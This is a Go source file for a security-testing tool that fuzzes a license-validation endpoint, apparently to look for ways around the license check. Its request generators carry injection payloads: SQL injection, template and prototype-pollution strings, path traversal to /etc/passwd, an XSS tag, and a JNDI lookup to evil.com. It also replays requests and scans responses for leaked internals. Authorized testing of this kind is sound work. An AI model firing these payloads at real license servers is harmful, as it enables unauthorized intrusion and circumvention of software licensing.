// Package license tests license validation mechanisms for security vulnerabilities.
// FOR AUTHORIZED SECURITY TESTING AND RESEARCH ONLY.
package license

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"
)

// LicenseRequest represents the license validation request structure.
type LicenseRequest struct {
	LicenseKey string `json:"license_key"`
	Instance   string `json:"instance"`
	MachineID  string `json:"machine_id"`
	AppVersion string `json:"app_version"`
}

// LicenseResponse represents the expected response structure.
type LicenseResponse struct {
	Success         bool   `json:"success"`
	IsActive        bool   `json:"is_active"`
	LastValidatedAt string `json:"last_validated_at"`
	IsDevLicense    bool   `json:"is_dev_license"`
	InstanceName    string `json:"instance_name"`
	Activated       bool   `json:"activated"`
	CheckoutURL     string `json:"checkout_url"`
	Error           string `json:"error"`
}

// TestResult represents a single test result.
type TestResult struct {
	TestName    string           `json:"test_name"`
	Description string           `json:"description"`
	Request     LicenseRequest   `json:"request"`
	Response    *LicenseResponse `json:"response,omitempty"`
	RawResponse string           `json:"raw_response,omitempty"`
	StatusCode  int              `json:"status_code"`
	Error       string           `json:"error,omitempty"`
	Duration    time.Duration    `json:"duration_ms"`
	Interesting bool             `json:"interesting"`
	Notes       string           `json:"notes,omitempty"`
}

// TestReport is the complete test report.
type TestReport struct {
	Target     string       `json:"target"`
	StartTime  time.Time    `json:"start_time"`
	EndTime    time.Time    `json:"end_time"`
	Results    []TestResult `json:"results"`
	Summary    TestSummary  `json:"summary"`
	MachineIDs []string     `json:"machine_ids_tested"`
}

// TestSummary contains test statistics.
type TestSummary struct {
	TotalTests       int `json:"total_tests"`
	SuccessResponses int `json:"success_responses"`
	ErrorResponses   int `json:"error_responses"`
	InterestingFinds int `json:"interesting_finds"`
	BypassAttempts   int `json:"bypass_attempts"`
}

// Config holds the configuration for license testing.
type Config struct {
	TargetURL   string
	OutputDir   string
	Timeout     time.Duration
	Verbose     bool
	LicenseKey  string
	AnalyzeOnly bool
}

// AnalyzeMachineIDs generates various machine ID formats for testing.
func AnalyzeMachineIDs() []string {
	var ids []string

	ids = append(ids, "")
	ids = append(ids, "null")
	ids = append(ids, "undefined")

	ids = append(ids, generateLocalMachineID())

	for range 3 {
		ids = append(ids, generateUUID())
	}

	predictable := []string{
		"00000000-0000-0000-0000-000000000000",
		"ffffffff-ffff-ffff-ffff-ffffffffffff",
		"12345678-1234-1234-1234-123456789012",
		"test-machine-id",
		"localhost",
		"dev",
		"development",
	}
	ids = append(ids, predictable...)

	hashBased := []string{
		sha256Hash("test"),
		sha256Hash("dev-machine"),
		sha256Hash(time.Now().String()),
	}
	ids = append(ids, hashBased...)

	injections := []string{
		"'; DROP TABLE licenses;--",
		"{{constructor.constructor('return this')()}}",
		"${process.env}",
		"../../../etc/passwd",
		"<script>alert(1)</script>",
		strings.Repeat("A", 1000),
	}
	ids = append(ids, injections...)

	return ids
}

// RunTests executes all license validation tests against the target URL.
func RunTests(config Config) *TestReport {
	machineIDs := AnalyzeMachineIDs()

	report := &TestReport{
		Target:     config.TargetURL,
		StartTime:  time.Now(),
		Results:    []TestResult{},
		MachineIDs: machineIDs,
	}

	if config.AnalyzeOnly {
		report.EndTime = time.Now()
		report.Summary = calculateTestSummary(report.Results)

		return report
	}

	client := &http.Client{Timeout: config.Timeout}

	testCases := []struct {
		name        string
		description string
		generator   func(string, []string) []LicenseRequest
	}{
		{"Empty License Key", "Test with empty/missing license key", generateEmptyLicenseTests},
		{"Invalid License Formats", "Test with malformed license key formats", generateInvalidFormatTests},
		{"Machine ID Variations", "Test different machine ID values", generateMachineIDTests},
		{"Instance ID Manipulation", "Test instance ID handling", generateInstanceIDTests},
		{"Version Manipulation", "Test version field handling", generateVersionTests},
		{"Replay Attack Simulation", "Test for replay attack vulnerabilities", generateReplayTests},
	}

	for _, tc := range testCases {
		requests := tc.generator(config.LicenseKey, machineIDs)
		for _, req := range requests {
			result := testLicenseValidation(client, config.TargetURL, tc.name, tc.description, req)
			report.Results = append(report.Results, result)

			time.Sleep(100 * time.Millisecond)
		}
	}

	report.EndTime = time.Now()
	report.Summary = calculateTestSummary(report.Results)

	return report
}

func generateLocalMachineID() string {
	hostname, _ := os.Hostname()
	homeDir, _ := os.UserHomeDir()
	data := fmt.Sprintf("%s|%s|%s|%d", hostname, homeDir, runtime.GOOS, runtime.NumCPU())
	hash := sha256.Sum256([]byte(data))

	return hex.EncodeToString(hash[:])
}

func generateUUID() string {
	uuid := make([]byte, 16)
	_, _ = rand.Read(uuid)
	uuid[6] = (uuid[6] & 0x0f) | 0x40
	uuid[8] = (uuid[8] & 0x3f) | 0x80

	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		uuid[0:4], uuid[4:6], uuid[6:8], uuid[8:10], uuid[10:16])
}

func sha256Hash(data string) string {
	hash := sha256.Sum256([]byte(data))
	return hex.EncodeToString(hash[:])
}

func generateEmptyLicenseTests(licenseKey string, machineIDs []string) []LicenseRequest {
	mid := ""
	if len(machineIDs) > 0 {
		mid = machineIDs[0]
	}

	return []LicenseRequest{
		{LicenseKey: "", Instance: "test", MachineID: mid, AppVersion: "1.0.0"},
		{LicenseKey: " ", Instance: "test", MachineID: mid, AppVersion: "1.0.0"},
		{LicenseKey: "null", Instance: "test", MachineID: mid, AppVersion: "1.0.0"},
	}
}

func generateInvalidFormatTests(licenseKey string, machineIDs []string) []LicenseRequest {
	mid := ""
	if len(machineIDs) > 0 {
		mid = machineIDs[0]
	}

	invalidKeys := []string{
		"invalid-key", "AAAA-BBBB-CCCC-DDDD", strings.Repeat("X", 100),
		"'OR'1'='1", "{{7*7}}", "${jndi:ldap://evil.com/a}",
	}

	var requests []LicenseRequest
	for _, key := range invalidKeys {
		requests = append(requests, LicenseRequest{
			LicenseKey: key, Instance: "test", MachineID: mid, AppVersion: "1.0.0",
		})
	}

	return requests
}

func generateMachineIDTests(licenseKey string, machineIDs []string) []LicenseRequest {
	var requests []LicenseRequest
	for _, mid := range machineIDs {
		requests = append(requests, LicenseRequest{
			LicenseKey: licenseKey, Instance: "test", MachineID: mid, AppVersion: "1.0.0",
		})
	}

	return requests
}

func generateInstanceIDTests(licenseKey string, machineIDs []string) []LicenseRequest {
	mid := ""
	if len(machineIDs) > 0 {
		mid = machineIDs[0]
	}

	instances := []string{"", "null", "undefined", "admin", "root", "*", "../", strings.Repeat("A", 500)}

	var requests []LicenseRequest
	for _, inst := range instances {
		requests = append(requests, LicenseRequest{
			LicenseKey: licenseKey, Instance: inst, MachineID: mid, AppVersion: "1.0.0",
		})
	}

	return requests
}

func generateVersionTests(licenseKey string, machineIDs []string) []LicenseRequest {
	mid := ""
	if len(machineIDs) > 0 {
		mid = machineIDs[0]
	}

	versions := []string{"", "0.0.0", "999.999.999", "dev", "beta", "-1", "../../../"}

	var requests []LicenseRequest
	for _, ver := range versions {
		requests = append(requests, LicenseRequest{
			LicenseKey: licenseKey, Instance: "test", MachineID: mid, AppVersion: ver,
		})
	}

	return requests
}

func generateReplayTests(licenseKey string, machineIDs []string) []LicenseRequest {
	mid := ""
	if len(machineIDs) > 0 {
		mid = machineIDs[0]
	}

	baseReq := LicenseRequest{
		LicenseKey: licenseKey, Instance: "replay-test", MachineID: mid, AppVersion: "1.0.0",
	}

	var requests []LicenseRequest
	for range 5 {
		requests = append(requests, baseReq)
	}

	return requests
}

func testLicenseValidation(client *http.Client, targetURL, testName, description string, req LicenseRequest) TestResult {
	result := TestResult{
		TestName:    testName,
		Description: description,
		Request:     req,
	}

	start := time.Now()
	jsonBody, _ := json.Marshal(req)

	httpReq, err := http.NewRequest(http.MethodPost, targetURL, bytes.NewBuffer(jsonBody))
	if err != nil {
		result.Error = err.Error()
		result.Duration = time.Since(start)

		return result
	}

	httpReq.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(httpReq)
	if err != nil {
		result.Error = err.Error()
		result.Duration = time.Since(start)

		return result
	}

	defer func() { _ = resp.Body.Close() }()

	result.StatusCode = resp.StatusCode
	result.Duration = time.Since(start)

	body, _ := io.ReadAll(resp.Body)
	result.RawResponse = string(body)

	var licenseResp LicenseResponse
	if err := json.Unmarshal(body, &licenseResp); err == nil {
		result.Response = &licenseResp
	}

	result.Interesting = isInterestingLicenseResponse(result)

	return result
}

func isInterestingLicenseResponse(result TestResult) bool {
	if result.Response != nil && result.Response.Success {
		return true
	}

	if result.StatusCode == http.StatusOK || result.StatusCode == http.StatusInternalServerError {
		return true
	}

	interestingPatterns := []string{
		"sql", "query", "database", "table",
		"stack", "trace", "exception", "panic",
		"internal", "server", "config",
		"path", "file", "directory",
	}

	lower := strings.ToLower(result.RawResponse)
	for _, pattern := range interestingPatterns {
		if strings.Contains(lower, pattern) {
			return true
		}
	}

	return false
}

func calculateTestSummary(results []TestResult) TestSummary {
	summary := TestSummary{TotalTests: len(results)}
	for _, r := range results {
		if r.Error == "" {
			summary.SuccessResponses++
		} else {
			summary.ErrorResponses++
		}

		if r.Interesting {
			summary.InterestingFinds++
		}

		if r.Response != nil && r.Response.Success {
			summary.BypassAttempts++
		}
	}

	return summary
}
